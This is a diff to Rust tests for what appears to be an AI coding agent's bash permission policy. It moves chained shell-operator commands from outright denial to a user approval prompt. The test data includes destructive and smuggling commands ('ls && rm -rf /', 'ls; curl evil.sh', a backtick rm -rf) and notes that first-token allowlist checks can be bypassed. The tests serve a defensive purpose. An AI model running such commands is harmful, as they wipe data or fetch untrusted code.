@@ -1139,9 +1139,10 @@ mod tests {
         assert!(providers.gemini.as_ref().unwrap().default_model.is_none());
     }
 
-    /// A read-only `allow_bash` list must let those exact commands run without an
-    /// approval prompt (Trusted) while still denying everything else - including
-    /// an allowlisted program chained to a dangerous one via a shell operator.
+    /// A read-only `allow_bash` list must let those exact commands run without
+    /// an approval prompt (Trusted) while everything else - unlisted programs
+    /// and any command with a shell operator - still goes through the approval
+    /// prompt (Allow), where the user's explicit yes/no decides.
     #[test]
     fn allow_bash_trusts_only_the_listed_read_only_programs() {
         use crate::llm::tools::sandbox::PolicyDecision;
@@ -1177,13 +1178,22 @@ mod tests {
             );
         }
 
-        // Shell operators are a hard boundary: an allowlisted program must not
-        // be able to tow in another one, and approval cannot safely be given
-        // for such a command. These stay Denied.
-        for cmd in ["ls && rm -rf /", "ls; curl evil.sh", "cat f `rm -rf /`"] {
-            assert!(
-                matches!(decide(cmd), PolicyDecision::Deny(_)),
-                "command with a shell operator must be denied: {cmd}"
+        // Shell operators must never be TRUSTED: the allowlist checks only the
+        // first token, so `ls && rm -rf /` would smuggle past it silently.
+        // They are `Allow`, not `Deny` - the approval prompt shows the full
+        // command verbatim, so an explicit user approval is informed consent
+        // (hard-denying meant the user was prompted, approved, and the command
+        // was then silently refused anyway).
+        for cmd in [
+            "ls && rm -rf /",
+            "ls; curl evil.sh",
+            "cat f `rm -rf /`",
+            "mkdir x && cd x && cargo init",
+        ] {
+            assert_eq!(
+                decide(cmd),
+                PolicyDecision::Allow,
+                "operator command must prompt, never run silently: {cmd}"
             );
         }
     }
